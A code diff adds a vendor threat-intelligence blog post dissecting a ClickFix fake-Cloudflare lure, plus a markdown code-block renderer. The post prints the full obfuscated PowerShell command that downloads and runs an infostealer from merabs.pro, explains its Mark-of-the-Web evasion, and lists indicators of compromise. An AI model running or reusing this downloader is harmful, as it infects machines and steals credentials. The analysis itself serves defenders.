@@ -1598,6 +1598,105 @@ By treating the browser as the true perimeter, Eyeball closes the massive securi
     date: "July 1, 2026",
     coverPattern: "linear-gradient(135deg, #090d16 0%, #1e1b4b 100%)",
     tags: ["Browser Security", "Identity Protection", "Zero-Trust", "Password Protection", "Adversary-in-the-Middle (AiTM)", "Phishing Protection"]
+  },
+  {
+    id: "10",
+    slug: "deconstructing-live-clickfix-infostealer-attack",
+    title: "Saved Live: Deconstructing a Real-World ClickFix Attack & its PowerShell Payload",
+    excerpt: "An Eyeball customer was targeted today with a highly realistic SMS/redirect scam delivering a malicious PowerShell script. We dissect the infection flow, the evasion tricks, and how client-side protection blocked the threat mid-execution.",
+    content: `## Saved Live: Deconstructing a Real-World ClickFix Attack & its PowerShell Payload
+
+Today, an Eyeball Security customer avoided a potentially devastating corporate breach when our browser-layer defense engine intervened to block a live, in-the-wild **ClickFix** (also known as ClickHijacking) attack. 
+
+This case study is a classic illustration of modern social engineering tactics. It demonstrates how threat actors bypass conventional perimeter controls, manipulate user trust in third-party services, and execute highly targeted obfuscated scripts directly on local endpoints.
+
+![See it in action: Eyeball Browser Security identifies and blocks the malicious ClickFix CAPTCHA fake prompt, preventing the user from copying the malicious execution command.](/MaozClickFixOptimize.gif)
+
+---
+
+### The Infection Vector: The Trusted Open Redirect
+
+The attack started with a simple, high-urgency message delivered directly to the client. The message claimed they had an outstanding debt with their legitimate insurance provider.
+
+* **The Bait:** The user was prompted to click an SMS-delivered shortened link (e.g., via a popular URL shortener).
+* **The Redirection:** This shortened link resolved to the insurance provider's *actual, legitimate domain name*.
+* **The Exploit:** However, the link exploited an open redirect vulnerability (or a subverted directory) on that trusted insurance portal. Without the address bar in the browser showing any suspicious changes, the user was silently pushed to a malicious landing page pretending to be a **Cloudflare security verification checkpoint**.
+* **The Instruction:** The fake verification overlay claimed: *"Verification Required: Please confirm your system capabilities to access the insurance portal."* 
+* **The Trigger:** The screen instructed the victim to press \`Win + R\` to open their local Run prompt, copy a "security key" from a button on the webpage, paste it into their shell window, and hit Enter.
+
+By framing this command execution as a mandatory Cloudflare system check, the threat actor bypassed a lifetime of standard web safety warnings. To a busy employee, this looked like an annoying but legitimate login verification screen.
+
+---
+
+### The Payload: Deconstructing the PowerShell Command
+
+The copied string sitting in the user's clipboard buffer was the following malicious PowerShell command. Let's look at the raw instruction before we break down its evasion and download layers:
+
+\`\`\`powershell
+powershell -NoP -w h -ep bypass -c "$h='merabs'+'.pro';$n='5a043604.exe';$u='https://'+$h+'/'+$n;$f=$env:TEMP+'\\\\x.exe';[Net.WebClient]::new().('Down'+'loadFile')($u,$f);Unblock-File $f -EA 0;ri ($f+':Zone.Identifier') -EA 0;$env:SEE_MASK_NOZONECHECKS=1;& $f"
+\`\`\`
+
+---
+
+### Technical Deep Dive: A Defensive Analysis
+
+From a defense perspective, this payload is a highly efficient, multi-staged downloader designed to evade endpoint antivirus, ignore security policies, and strip default operating system safeguards.
+
+#### 1. Execution Parameters (The Evader Setup)
+*   \`-NoP\` (\`-NoProfile\`): Directs PowerShell not to load the user's custom interactive profile. This accelerates start time, reduces system footprint, and prevents local security profiles from altering the environment.
+*   \`-w h\` (\`-WindowStyle Hidden\`): Instructs Windows to launch the terminal completely invisibly. The victim sees no console popup, flashing cursor, or system warning. The entire operation runs silently in the background.
+*   \`-ep bypass\` (\`-ExecutionPolicy Bypass\`): Explicitly instructs PowerShell to ignore any system-wide execution policies that would otherwise block unsigned or untrusted scripts.
+
+#### 2. Obfuscation Tactics (Evading Static Signatures)
+Modern endpoint defenses actively scan command-line arguments for suspicious domains or web requests. To evade signature matches (such as YARA rules), the author splits sensitive strings:
+*   \`$h='merabs'+'.pro'\` and \`$n='5a043604.exe'\` reconstruct the URL dynamically: \`https://merabs.pro/5a043604.exe\`.
+*   \`('Down'+'loadFile')\` splits the actual .NET method call, ensuring static analysis rules watching for the \`DownloadFile\` function signature remain blind to the download stream.
+
+#### 3. Mark-of-the-Web (MOTW) Evasion (The Crown Jewel of Evasion)
+When files are downloaded over the internet via standard web clients, Windows appends an **Alternative Data Stream (ADS)** called \`:Zone.Identifier\`. This is how Windows knows the file came from an untrusted outside source, triggering SmartScreen warnings, blocking execution, or launching office files in a sandbox.
+The threat actor uses two commands to completely erase this metadata:
+*   \`Unblock-File $f -EA 0\`: Directs PowerShell to strip the untrusted zone label from the file.
+*   \`ri ($f+':Zone.Identifier') -EA 0\` (\`Remove-Item\`): Forcibly deletes the \`:Zone.Identifier\` stream directly, ensuring no operating system warning is ever shown when the executable runs. The \`-EA 0\` (\`-ErrorAction SilentlyContinue\`) ensures that even if the command encounters an error, it continues executing without alerting the user.
+
+#### 4. Disabling Shell Protection
+*   \`$env:SEE_MASK_NOZONECHECKS=1\`: This modifies the current environment variables to disable automatic zone checking in \`shell32\`. It blocks Windows from popping up confirmation dialogs before executing downloaded files via shell utilities.
+
+#### 5. Local Dropper Execution
+*   \`& $f\`: Uses the PowerShell invocation operator (\`&\`) to execute the freshly downloaded, unblocked payload (\`x.exe\` saved under the user's \`%TEMP%\` folder). This executable is a known infostealer dropper designed to harvest local session cookies, crypto wallets, and browser-stored credentials.
+
+---
+
+### Why Traditional Security Failed (and Why Eyeball Blocked It)
+
+This attack exposes the severe gaps in legacy security perimeters:
+*   **Secure Web Gateways (SWG) are blind:** The malicious payload was not downloaded over the HTTP session directly. The user was guided to copy-paste a string. The SWG only sees an encrypted HTTPS connection to a trusted domain, followed by a copy operation that occurs entirely in memory.
+*   **Reputation Filters are bypassed:** The initial redirect URL resolved to a highly trusted corporate insurance domain. It was never on any malicious blocklist.
+*   **Static Endpoint AVs fail:** Because the download is initiated by a native, legitimate system utility (\`powershell.exe\`) with obfuscated strings, traditional static heuristics frequently let the command execute unchallenged.
+
+#### How Eyeball Stopped It
+Because **Eyeball Browser Security** operates natively inside the web browser—the true perimeter where data interaction and execution occur—it maintains total visibility. 
+
+Eyeball's client-side heuristics instantly detected the malicious DOM overlay simulating Cloudflare, recognized the suspicious clip-hijacking behavior prompting clipboard access, and blocked the interaction before the user could copy the script. The attack was neutralized mid-flight, keeping the client's corporate network and credentials completely secure.
+
+By securing the point of execution, Eyeball ensures that even when users are manipulated, the system remains impenetrable.
+
+---
+
+### Indicators of Compromise (IoCs)
+
+To assist fellow defenders, the threat intelligence team has cataloged the indicators of compromise associated with today's live ClickFix campaign:
+
+*   **Malicious Dropper Host:** \`merabs.pro\`
+*   **Payload File Name:** \`5a043604.exe\` (saved locally as \`x.exe\`)
+*   **Malicious Executable SHA256:** \`f5d1dd9ff3a9150b655499d2580569027f242f53cbdc0c3d6813e7a0bb066c65\`
+*   **VirusTotal Analysis:** [View Report on VirusTotal](https://www.virustotal.com/gui/file/f5d1dd9ff3a9150b655499d2580569027f242f53cbdc0c3d6813e7a0bb066c65)`,
+    author: "EyeBall Threat Intelligence",
+    authorTitle: "Research & Analysis Group",
+    category: "Threat Intel",
+    readTime: "6 min read",
+    date: "July 2, 2026",
+    coverPattern: "linear-gradient(135deg, #1e293b 0%, #0f172a 100%)",
+    tags: ["ClickFix", "Threat Intel", "PowerShell Analysis", "Evasion Techniques", "Adware/Infostealer", "In-The-Wild"]
   }
 ];
 
@@ -1778,6 +1877,28 @@ const BlogView = () => {
       const line = lines[i];
       const trimmed = line.trim();
       
+      // 0. Code Block
+      if (trimmed.startsWith('```')) {
+        const lang = trimmed.slice(3).trim();
+        const codeLines = [];
+        i++; // skip opening ```
+        while (i < lines.length && !lines[i].trim().startsWith('```')) {
+          codeLines.push(lines[i]);
+          i++;
+        }
+        if (i < lines.length) i++; // skip closing ```
+        elements.push(html`
+          <div key=${i} class="my-6 border border-white/10 rounded-2xl bg-black/40 overflow-hidden font-mono text-sm leading-relaxed text-brand-light-secondary shadow-2xl">
+            <div class="px-4 py-2 bg-white/5 border-b border-white/5 text-xs text-brand-blue uppercase font-bold tracking-wider flex justify-between items-center">
+              <span>${lang || 'CODE'}</span>
+              <span class="text-[10px] text-white/30 lowercase font-mono">Terminal Output</span>
+            </div>
+            <pre class="p-5 overflow-x-auto whitespace-pre scrolling-touch select-all text-xs md:text-sm text-brand-cyan scrollbar-thin"><code>${codeLines.join('\n')}</code></pre>
+          </div>
+        `);
+        continue;
+      }
+
       // 1. Heading 2
       if (trimmed.startsWith('## ')) {
         elements.push(html`<h2 key=${i} class="text-2xl md:text-3xl font-bold text-white mt-10 mb-4 border-b border-white/10 pb-2">${trimmed.replace('## ', '')}</h2>`);
